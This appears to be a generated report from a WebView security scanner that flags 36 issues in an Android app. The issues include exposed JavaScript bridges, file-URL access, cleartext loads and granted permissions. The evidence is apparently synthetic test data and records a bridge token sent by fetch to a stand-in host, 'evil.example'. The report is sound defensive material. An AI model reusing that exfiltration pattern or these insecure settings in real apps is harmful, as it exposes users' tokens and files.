# Sentry WebView Security Report

## Summary

- Risk score: 100/100
- Events analyzed: 53
- Findings: 36
- WebViews observed: 3
- Skipped non-event lines: 0

## Severity Counts

- Critical: 4
- High: 12
- Medium: 14
- Low: 4
- Info: 2

## Findings

### 1. [CRITICAL] Sensitive native bridge data reached a JavaScript sink

- Rule: `WV-TAINTED-BRIDGE-DATA-TO-JS-SINK`
- Description: A value returned by a sensitive-looking native JavaScript bridge method flowed into a JavaScript sink such as network, navigation, postMessage, eval, or storage.
- Recommendation: Avoid returning sensitive native data directly to JavaScript. If this bridge is required, restrict it to trusted origins and prevent sensitive values from reaching network or navigation sinks.
- Evidence:
  - `{"arguments": ["http://evil.example/x?t=tok-123"], "href": "http://remote.example/page", "sink": "fetch", "sinkUrl": "http://evil.example/x?t=tok-123", "taints": [{"id": "taint-1-0", "source": {"interfaceName": "AppBridge", "methodName": "getToken"}, "valuePreview": "tok-123"}], "timestamp": "2026-01-01T00:00:35.000Z", "webViewId": "android.webkit.WebView:111"}`

### 2. [CRITICAL] Sensitive native bridge data reached a JavaScript sink

- Rule: `WV-TAINTED-BRIDGE-DATA-TO-JS-SINK`
- Description: A value returned by a sensitive-looking native JavaScript bridge method flowed into a JavaScript sink such as network, navigation, postMessage, eval, or storage.
- Recommendation: Avoid returning sensitive native data directly to JavaScript. If this bridge is required, restrict it to trusted origins and prevent sensitive values from reaching network or navigation sinks.
- Evidence:
  - `{"arguments": ["tok-123", "https://parent.example"], "href": "http://remote.example/page", "sink": "window.postMessage", "sinkUrl": "https://parent.example", "taints": [{"id": "taint-1-0", "source": {}, "valuePreview": "tok-123"}], "timestamp": "2026-01-01T00:00:36.000Z", "webViewId": "android.webkit.WebView:111"}`

### 3. [CRITICAL] Sensitive native bridge data reached a JavaScript sink

- Rule: `WV-TAINTED-BRIDGE-DATA-TO-JS-SINK`
- Description: A value returned by a sensitive-looking native JavaScript bridge method flowed into a JavaScript sink such as network, navigation, postMessage, eval, or storage.
- Recommendation: Avoid returning sensitive native data directly to JavaScript. If this bridge is required, restrict it to trusted origins and prevent sensitive values from reaching network or navigation sinks.
- Evidence:
  - `{"arguments": ["k", "tok-123"], "href": "http://remote.example/page", "sink": "localStorage.setItem", "sinkUrl": null, "taints": [{"id": "taint-1-0", "source": {}, "valuePreview": "tok-123"}], "timestamp": "2026-01-01T00:00:37.000Z", "webViewId": "android.webkit.WebView:111"}`

### 4. [CRITICAL] File URLs can access arbitrary origins

- Rule: `WV-UNIVERSAL-FILE-ACCESS`
- Description: A file:// page can make network requests to arbitrary origins. This is a high-impact WebView misconfiguration.
- Recommendation: Keep allowUniversalAccessFromFileURLs disabled and serve local content from a constrained WebViewAssetLoader origin when possible.
- Evidence:
  - `{"setting": "setAllowUniversalAccessFromFileURLs", "timestamp": "2026-01-01T00:00:05.000Z", "value": true, "webViewId": "android.webkit.WebView:111"}`

### 5. [HIGH] Remote WebView content called a native bridge method

- Rule: `WV-BRIDGE-CALLED-BY-REMOTE-CONTENT`
- Description: Remote content invoked a native JavaScript bridge method. This is a direct native attack surface from web content.
- Recommendation: Restrict bridge calls to trusted origins and validate authorization inside the bridge method before performing native actions.
- Evidence:
  - `{"args": [], "attachedOrigin": "http://remote.example", "currentOrigin": "http://remote.example", "error": null, "interfaceName": "AppBridge", "methodName": "getToken", "pageUrl": "http://remote.example/page", "retval": "tok-123", "timestamp": "2026-01-01T00:00:32.000Z", "webViewId": "android.webkit.WebView:111"}`

### 6. [HIGH] Remote WebView content called a native bridge method

- Rule: `WV-BRIDGE-CALLED-BY-REMOTE-CONTENT`
- Description: Remote content invoked a native JavaScript bridge method. This is a direct native attack surface from web content.
- Recommendation: Restrict bridge calls to trusted origins and validate authorization inside the bridge method before performing native actions.
- Evidence:
  - `{"args": ["xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx..."], "attachedOrigin": null, "currentOrigin": "http://remote.example", "error": "boom", "interfaceName": "AppBridge", "methodName": "ping", "pageUrl": "http://remote.example/page", "retval": null, "timestamp": "2026-01-01T00:00:33.000Z", "webViewId": "android.webkit.WebView:111"}`

### 7. [HIGH] Cleartext HTTP content loaded in WebView

- Rule: `WV-CLEARTEXT-URL`
- Description: The WebView loaded content over HTTP. Cleartext traffic can be intercepted or modified, which is especially dangerous when JavaScript bridges are exposed.
- Recommendation: Use HTTPS for WebView content and disable cleartext traffic in the Android network security configuration.
- Evidence:
  - `{"source": "loadUrl", "timestamp": "2026-01-01T00:00:16.000Z", "url": "http://insecure.example/index.html", "webViewId": "android.webkit.WebView:111"}`
  - `{"source": "loadUrl", "timestamp": "2026-01-01T00:00:17.000Z", "url": "http://insecure.example/index.html", "webViewId": "android.webkit.WebView:111"}`

### 8. [HIGH] Cleartext HTTP content loaded in WebView

- Rule: `WV-CLEARTEXT-URL`
- Description: The WebView loaded content over HTTP. Cleartext traffic can be intercepted or modified, which is especially dangerous when JavaScript bridges are exposed.
- Recommendation: Use HTTPS for WebView content and disable cleartext traffic in the Android network security configuration.
- Evidence:
  - `{"source": "loadUrl", "timestamp": "2026-01-01T00:00:26.000Z", "url": "http://remote.example/page", "webViewId": "android.webkit.WebView:111"}`

### 9. [HIGH] File URLs can access other file URLs

- Rule: `WV-FILE-FROM-FILE`
- Description: A page loaded from file:// can read other file:// resources, which can expose local app or device files.
- Recommendation: Keep allowFileAccessFromFileURLs disabled and avoid loading untrusted file:// pages.
- Evidence:
  - `{"setting": "setAllowFileAccessFromFileURLs", "timestamp": "2026-01-01T00:00:04.000Z", "value": true, "webViewId": "android.webkit.WebView:111"}`

### 10. [HIGH] file:// content loaded in WebView

- Rule: `WV-FILE-URL-LOADED`
- Description: The WebView loaded local file content. file:// pages are risky when file access or JavaScript bridges are enabled.
- Recommendation: Avoid file:// content for untrusted pages. Prefer WebViewAssetLoader or a tightly controlled HTTPS origin.
- Evidence:
  - `{"source": "loadUrl", "timestamp": "2026-01-01T00:00:18.000Z", "url": "file:///android_asset/index.html", "webViewId": "android.webkit.WebView:111"}`

### 11. [HIGH] JavaScript bridge exposed to WebView content

- Rule: `WV-JS-BRIDGE-EXPOSED`
- Description: A native object was exposed to JavaScript through addJavascriptInterface. Any page that can run JavaScript in this WebView can attempt to call annotated public methods.
- Recommendation: Expose bridges only to trusted origins, remove the bridge before loading untrusted content, and enforce origin checks in every sensitive method.
- Evidence:
  - `{"className": "com.example.Bridge", "interfaceName": "AppBridge", "origin": "http://remote.example", "pageUrl": "http://remote.example/page", "timestamp": "2026-01-01T00:00:27.000Z", "trusted": false, "webViewId": "android.webkit.WebView:111"}`

### 12. [HIGH] JavaScript bridge exposed to WebView content

- Rule: `WV-JS-BRIDGE-EXPOSED`
- Description: A native object was exposed to JavaScript through addJavascriptInterface. Any page that can run JavaScript in this WebView can attempt to call annotated public methods.
- Recommendation: Expose bridges only to trusted origins, remove the bridge before loading untrusted content, and enforce origin checks in every sensitive method.
- Evidence:
  - `{"className": "com.example.Other", "interfaceName": "Other", "origin": "http://remote.example", "pageUrl": "http://remote.example/page", "timestamp": "2026-01-01T00:00:28.000Z", "trusted": false, "webViewId": "android.webkit.WebView:111"}`

### 13. [HIGH] Mixed content is always allowed

- Rule: `WV-MIXED-CONTENT`
- Description: The WebView allows HTTPS pages to load cleartext HTTP subresources, weakening transport security.
- Recommendation: Use MIXED_CONTENT_NEVER_ALLOW unless a documented legacy compatibility case exists.
- Evidence:
  - `{"setting": "setMixedContentMode", "timestamp": "2026-01-01T00:00:09.000Z", "value": 0, "webViewId": "android.webkit.WebView:111"}`

### 14. [HIGH] Sensitive-looking JavaScript bridge method exposed

- Rule: `WV-SENSITIVE-BRIDGE-METHOD`
- Description: A JavaScript bridge exposes a method whose name suggests access to sensitive data, permissions, files, device identifiers, or device capabilities.
- Recommendation: Audit the method implementation, require trusted-origin checks, and avoid returning sensitive native data directly to JavaScript.
- Evidence:
  - `{"args": [], "className": "com.example.Bridge", "interfaceName": "AppBridge", "method": "getToken", "timestamp": "2026-01-01T00:00:29.000Z", "webViewId": "android.webkit.WebView:111"}`

### 15. [HIGH] Sensitive-looking JavaScript bridge method exposed

- Rule: `WV-SENSITIVE-BRIDGE-METHOD`
- Description: A JavaScript bridge exposes a method whose name suggests access to sensitive data, permissions, files, device identifiers, or device capabilities.
- Recommendation: Audit the method implementation, require trusted-origin checks, and avoid returning sensitive native data directly to JavaScript.
- Evidence:
  - `{"args": ["java.lang.String"], "className": "com.example.Ghost", "interfaceName": "Ghost", "method": "readFile", "timestamp": "2026-01-01T00:00:31.000Z", "webViewId": "android.webkit.WebView:111"}`

### 16. [HIGH] WebView permission was granted to web content

- Rule: `WV-WEB-PERMISSION-GRANTED`
- Description: A WebView permission request was granted. Camera, microphone, and geolocation grants can expose sensitive user data to web content.
- Recommendation: Only grant permissions to a small allowlist of HTTPS origins and never grant all requested resources blindly.
- Evidence:
  - `{"origin": "http://remote.example/", "resources": ["android.webkit.resource.AUDIO_CAPTURE"], "timestamp": "2026-01-01T00:00:50.000Z"}`

### 17. [MEDIUM] File access is enabled

- Rule: `WV-FILE-ACCESS`
- Description: The WebView can access local files. Combined with file URLs, content injection, or permissive bridge methods, this can expose app-private data.
- Recommendation: Disable file access unless the app has a specific local-content use case.
- Evidence:
  - `{"setting": "setAllowFileAccess", "timestamp": "2026-01-01T00:00:02.000Z", "value": true, "webViewId": "android.webkit.WebView:111"}`
  - `{"setting": "setAllowFileAccess", "timestamp": "2026-01-01T00:00:11.000Z", "value": true, "webViewId": "android.webkit.WebView:111"}`

### 18. [MEDIUM] Inline HTML content loaded in WebView

- Rule: `WV-INLINE-CONTENT`
- Description: The app loaded inline WebView content. Inline content can bypass normal origin assumptions and complicates bridge exposure analysis.
- Recommendation: Use a stable trusted origin for hybrid content and avoid exposing native bridges to inline or attacker-influenced HTML.
- Evidence:
  - `{"source": "loadData", "timestamp": "2026-01-01T00:00:19.000Z", "url": null, "webViewId": "android.webkit.WebView:111"}`

### 19. [MEDIUM] Inline HTML content loaded in WebView

- Rule: `WV-INLINE-CONTENT`
- Description: The app loaded inline WebView content. Inline content can bypass normal origin assumptions and complicates bridge exposure analysis.
- Recommendation: Use a stable trusted origin for hybrid content and avoid exposing native bridges to inline or attacker-influenced HTML.
- Evidence:
  - `{"source": "loadDataWithBaseURL", "timestamp": "2026-01-01T00:00:20.000Z", "url": "https://app.example/", "webViewId": "android.webkit.WebView:111"}`

### 20. [MEDIUM] Inline HTML content loaded in WebView

- Rule: `WV-INLINE-CONTENT`
- Description: The app loaded inline WebView content. Inline content can bypass normal origin assumptions and complicates bridge exposure analysis.
- Recommendation: Use a stable trusted origin for hybrid content and avoid exposing native bridges to inline or attacker-influenced HTML.
- Evidence:
  - `{"source": "loadUrl", "timestamp": "2026-01-01T00:00:21.000Z", "url": "data:text/html,<b>hi</b>", "webViewId": "android.webkit.WebView:111"}`

### 21. [MEDIUM] WebView JavaScript contacted a cleartext URL

- Rule: `WV-JS-CLEARTEXT-NETWORK`
- Description: JavaScript running inside the WebView made or prepared a cleartext HTTP request.
- Recommendation: Use HTTPS endpoints and apply Content Security Policy or application-level URL allowlists.
- Evidence:
  - `{"api": "fetch", "href": "http://remote.example/page", "timestamp": "2026-01-01T00:00:35.000Z", "url": "http://evil.example/x?t=tok-123", "webViewId": "android.webkit.WebView:111"}`

### 22. [MEDIUM] WebView JavaScript contacted a cleartext URL

- Rule: `WV-JS-CLEARTEXT-NETWORK`
- Description: JavaScript running inside the WebView made or prepared a cleartext HTTP request.
- Recommendation: Use HTTPS endpoints and apply Content Security Policy or application-level URL allowlists.
- Evidence:
  - `{"api": "fetch", "href": "https://app.example/", "timestamp": "2026-01-01T00:00:41.000Z", "url": "http://api.example/data", "webViewId": "android.webkit.WebView:222"}`

### 23. [MEDIUM] WebView JavaScript contacted a cleartext URL

- Rule: `WV-JS-CLEARTEXT-NETWORK`
- Description: JavaScript running inside the WebView made or prepared a cleartext HTTP request.
- Recommendation: Use HTTPS endpoints and apply Content Security Policy or application-level URL allowlists.
- Evidence:
  - `{"api": "XMLHttpRequest.open", "href": "https://app.example/", "timestamp": "2026-01-01T00:00:43.000Z", "url": "http://api.example/xhr", "webViewId": "android.webkit.WebView:222"}`

### 24. [MEDIUM] JavaScript execution is enabled

- Rule: `WV-JS-ENABLED`
- Description: JavaScript is enabled in a WebView. This is expected for hybrid apps, but it increases the impact of untrusted content, XSS, and exposed JavaScript bridges.
- Recommendation: Only enable JavaScript for trusted content and pair it with strict origin checks before exposing native bridges.
- Evidence:
  - `{"setting": "setJavaScriptEnabled", "timestamp": "2026-01-01T00:00:01.000Z", "value": true, "webViewId": "android.webkit.WebView:111"}`

### 25. [MEDIUM] WebView page executed JavaScript eval

- Rule: `WV-JS-EVAL`
- Description: JavaScript running inside the WebView called eval, which increases XSS and injection impact.
- Recommendation: Avoid eval and use safer parsing or dispatch mechanisms.
- Evidence:
  - `{"arguments": ["1+1"], "href": "https://app.example/", "timestamp": "2026-01-01T00:00:40.000Z", "webViewId": "android.webkit.WebView:222"}`

### 26. [MEDIUM] Native code evaluated JavaScript in WebView

- Rule: `WV-JS-EVALUATED`
- Description: The app called evaluateJavascript. If script contents include attacker-controlled data, this can become JavaScript injection.
- Recommendation: Avoid string-built JavaScript. Use structured message passing and encode any values inserted into JavaScript code.
- Evidence:
  - `{"pageUrl": "https://app.example/", "script": "window.init()", "timestamp": "2026-01-01T00:00:38.000Z", "webViewId": "android.webkit.WebView:222"}`
  - `{"pageUrl": "https://app.example/", "script": "window.init()", "timestamp": "2026-01-01T00:00:39.000Z", "webViewId": "android.webkit.WebView:222"}`

### 27. [MEDIUM] Safe Browsing is disabled

- Rule: `WV-SAFE-BROWSING-DISABLED`
- Description: WebView Safe Browsing was disabled, reducing protection against known malicious URLs.
- Recommendation: Leave Safe Browsing enabled unless there is a documented compatibility reason.
- Evidence:
  - `{"setting": "setSafeBrowsingEnabled", "timestamp": "2026-01-01T00:00:06.000Z", "value": false, "webViewId": "android.webkit.WebView:111"}`

### 28. [MEDIUM] WebView permission was granted to web content

- Rule: `WV-WEB-PERMISSION-GRANTED`
- Description: A WebView permission request was granted. Camera, microphone, and geolocation grants can expose sensitive user data to web content.
- Recommendation: Only grant permissions to a small allowlist of HTTPS origins and never grant all requested resources blindly.
- Evidence:
  - `{"origin": "https://app.example/", "resources": ["android.webkit.resource.VIDEO_CAPTURE"], "timestamp": "2026-01-01T00:00:51.000Z"}`

### 29. [MEDIUM] WebView content requested a browser permission

- Rule: `WV-WEB-PERMISSION-REQUEST`
- Description: Web content requested a WebView browser permission such as camera, microphone, protected media, MIDI, or geolocation.
- Recommendation: Grant WebView permissions only after validating the request origin and the exact requested resources.
- Evidence:
  - `{"origin": "https://app.example/", "resources": ["android.webkit.resource.VIDEO_CAPTURE"], "timestamp": "2026-01-01T00:00:47.000Z", "type": null}`

### 30. [MEDIUM] WebView content requested a browser permission

- Rule: `WV-WEB-PERMISSION-REQUEST`
- Description: Web content requested a WebView browser permission such as camera, microphone, protected media, MIDI, or geolocation.
- Recommendation: Grant WebView permissions only after validating the request origin and the exact requested resources.
- Evidence:
  - `{"origin": "http://remote.example/", "resources": null, "timestamp": "2026-01-01T00:00:48.000Z", "type": "geolocation"}`

### 31. [LOW] Content provider access is enabled

- Rule: `WV-CONTENT-ACCESS`
- Description: The WebView can load content:// resources. This can become risky when untrusted content can influence loaded URLs.
- Recommendation: Disable content access unless required and validate all content:// URLs before loading them.
- Evidence:
  - `{"setting": "setAllowContentAccess", "timestamp": "2026-01-01T00:00:03.000Z", "value": "true", "webViewId": "android.webkit.WebView:111"}`

### 32. [LOW] Geolocation is enabled

- Rule: `WV-GEOLOCATION-ENABLED`
- Description: Geolocation support is enabled in WebView content.
- Recommendation: Only allow geolocation for trusted origins and ensure prompts are not auto-approved.
- Evidence:
  - `{"setting": "setGeolocationEnabled", "timestamp": "2026-01-01T00:00:07.000Z", "value": true, "webViewId": "android.webkit.WebView:111"}`

### 33. [LOW] JavaScript can open windows automatically

- Rule: `WV-JS-POPUPS`
- Description: JavaScript is allowed to open windows without user gestures, which can enable unwanted navigation flows.
- Recommendation: Disable automatic window opening unless required by trusted content.
- Evidence:
  - `{"setting": "setJavaScriptCanOpenWindowsAutomatically", "timestamp": "2026-01-01T00:00:08.000Z", "value": true, "webViewId": "android.webkit.WebView:111"}`

### 34. [LOW] WebView content requested a browser permission

- Rule: `WV-WEB-PERMISSION-REQUEST`
- Description: Web content requested a WebView browser permission such as camera, microphone, protected media, MIDI, or geolocation.
- Recommendation: Grant WebView permissions only after validating the request origin and the exact requested resources.
- Evidence:
  - `{"origin": null, "resources": [], "timestamp": "2026-01-01T00:00:49.000Z", "type": null}`

### 35. [INFO] JavaScript probe reported an error

- Rule: `WV-PROBE-ERROR`
- Description: The injected JavaScript probe could not run or parse its result for at least one WebView state.
- Recommendation: Review whether the page navigated, blocked script execution, or removed probe state.
- Evidence:
  - `{"error": "Error: blocked", "href": null, "timestamp": "2026-01-01T00:00:45.000Z", "webViewId": "android.webkit.WebView:222"}`

### 36. [INFO] JavaScript probe reported an error

- Rule: `WV-PROBE-ERROR`
- Description: The injected JavaScript probe could not run or parse its result for at least one WebView state.
- Recommendation: Review whether the page navigated, blocked script execution, or removed probe state.
- Evidence:
  - `{"error": "failed to parse probe result", "href": "https://app.example/", "timestamp": "2026-01-01T00:00:46.000Z", "webViewId": "android.webkit.WebView:222"}`


## WebView Inventory

### WebView android.webkit.WebView:111

- URLs observed: 8
- Settings observed: 10
- Bridges observed: 2
- Bridge methods observed: 3
- Bridge calls observed: 2
- JavaScript events observed: 4
- Recent URLs:
  - `https://app.example/`
  - `data:text/html,<b>hi</b>`
  - `https://app.example/home`
  - `https://app.example/post`
  - `http://remote.example/page`

### WebView android.webkit.WebView:222

- URLs observed: 0
- Settings observed: 0
- Bridges observed: 0
- Bridge methods observed: 0
- Bridge calls observed: 0
- JavaScript events observed: 5

### WebView unknown

- URLs observed: 1
- Settings observed: 1
- Bridges observed: 0
- Bridge methods observed: 0
- Bridge calls observed: 0
- JavaScript events observed: 0
- Recent URLs:
  - `about:blank`


## Sensitive Data Flows

### WebView android.webkit.WebView:111

- Sink: `fetch`
  - Page: `http://remote.example/page`
  - Destination: `http://evil.example/x?t=tok-123`
  - Source: `AppBridge.getToken` (unknown class)
  - Value preview: `tok-123`
- Sink: `window.postMessage`
  - Page: `http://remote.example/page`
  - Destination: `https://parent.example`
  - Source: `None.None` (unknown class)
  - Value preview: `tok-123`
- Sink: `localStorage.setItem`
  - Page: `http://remote.example/page`
  - Source: `None.None` (unknown class)
  - Value preview: `tok-123`


## Origin To Bridge Map

### WebView android.webkit.WebView:111

#### `http://remote.example`

- Classification: untrusted, remote
- Page URLs:
  - `http://remote.example/page`
- Bridges:
  - `AppBridge` (com.example.Bridge): 2 methods, 2 calls
    - Methods: `getToken`, `ping`
    - Call: `getToken` at `http://remote.example/page`
    - Call: `ping` at `http://remote.example/page`
  - `Other` (com.example.Other): 0 methods, 0 calls

#### `unknown`

- Classification: untrusted, local
- Bridges:
  - `Ghost` (com.example.Ghost): 1 methods, 0 calls
    - Methods: `readFile`

### WebView android.webkit.WebView:222

No JavaScript bridge origins were observed for this WebView.

### WebView unknown

No JavaScript bridge origins were observed for this WebView.
